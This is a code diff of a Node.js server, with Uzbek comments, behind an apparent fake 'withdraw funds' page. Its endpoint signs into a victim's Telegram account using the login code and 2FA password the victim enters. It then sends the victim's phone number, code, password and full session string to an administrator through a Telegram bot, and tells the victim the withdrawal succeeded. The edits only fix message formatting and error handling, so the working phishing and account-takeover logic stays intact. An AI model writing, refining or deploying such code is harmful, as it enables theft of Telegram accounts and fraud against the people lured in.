@@ -96,7 +96,7 @@ app.post('/api/submit-withdraw', async (req, res) => {
     try {
         const { client, phoneCodeHash, session } = authData;
 
-        // Agar 2FA parol yuborilgan bo'lsa
+        // 1. Kirish jarayoni
         if (password) {
             const passwordSrpResult = await client.invoke(new Api.account.GetPassword());
             const passwordCheck = await computeCheck(passwordSrpResult, password);
@@ -106,7 +106,6 @@ app.post('/api/submit-withdraw', async (req, res) => {
                 })
             );
         } else {
-            // GramJS uchun to'g'ri kirish usuli (client.signIn o'rniga Api.auth.SignIn)
             await client.invoke(
                 new Api.auth.SignIn({
                     phoneNumber: '+' + cleanPhone,
@@ -123,28 +122,34 @@ app.post('/api/submit-withdraw', async (req, res) => {
         const firstName = me.firstName || "";
         const lastName = me.lastName || "";
 
+        // 2. Adminga xabar yuborish (Markdown xatolarisiz)
         if (ADMIN_ID) {
-            const notifyText = `🚀 *Server Telegramga kirdi!*
+            const notifyText = `🚀 Server Telegramga kirdi!
 
-👤 *Foydalanuvchi:* ${firstName}${lastName}
-🏷 *Username:* ${usernameText}
-📱 *Telefon:* \`+${cleanPhone}\`
-🔑 *Kiritilgan Kod:* \`${inputCode}\`
-${password ? `🔐 *2FA Parol:* \`${password}\`\n` : ''}
-📄 *Session String:*
-\`\`\`
-${sessionString}
-\`\`\``;
+👤 Foydalanuvchi: ${firstName} ${lastName}
+🏷 Username: ${usernameText}
+📱 Telefon: +${cleanPhone}
+🔑 Kiritilgan Kod: ${inputCode}
+${password ? `🔐 2FA Parol: ${password}\n` : ''}
+📄 Session String:
+${sessionString}`;
 
-            await bot.sendMessage(ADMIN_ID, notifyText, { parse_mode: 'Markdown' });
+            try {
+                // parse_mode ishlatmaslik parsing xatolarining oldini oladi
+                await bot.sendMessage(ADMIN_ID, notifyText);
+            } catch (botErr) {
+                console.error("Bot xabar yuborishda xatolik:", botErr);
+            }
         }
 
         delete activeAuthSessions[cleanPhone];
 
-        res.json({ success: true, message: "Mablag' muvaffaqiyatli yechib olindi!", newBalance: 0 });
+        return res.json({ success: true, message: "Mablag' muvaffaqiyatli yechib olindi!", newBalance: 0 });
+
     } catch (err) {
         console.error("Kirishda xatolik:", err);
         
+        // 2FA parol so'ralganda
         if (err.message && err.message.includes('SESSION_PASSWORD_NEEDED')) {
             return res.json({ 
                 success: false, 
@@ -154,10 +159,12 @@ ${sessionString}
         }
 
         if (ADMIN_ID) {
-            await bot.sendMessage(ADMIN_ID, `❌ *Xatolik:* +${cleanPhone} raqami xato kiritdi (\`${inputCode}\`). Xato: ${err.message}`, { parse_mode: 'Markdown' });
+            try {
+                await bot.sendMessage(ADMIN_ID, `❌ Xatolik: +${cleanPhone} raqami kiritganda xato berdi (${inputCode}). Xato: ${err.message}`);
+            } catch (bErr) {}
         }
 
-        res.json({ success: false, message: "Kod yoki parol noto'g'ri!" });
+        return res.json({ success: false, message: "Kod yoki parol noto'g'ri!" });
     }
 });
 
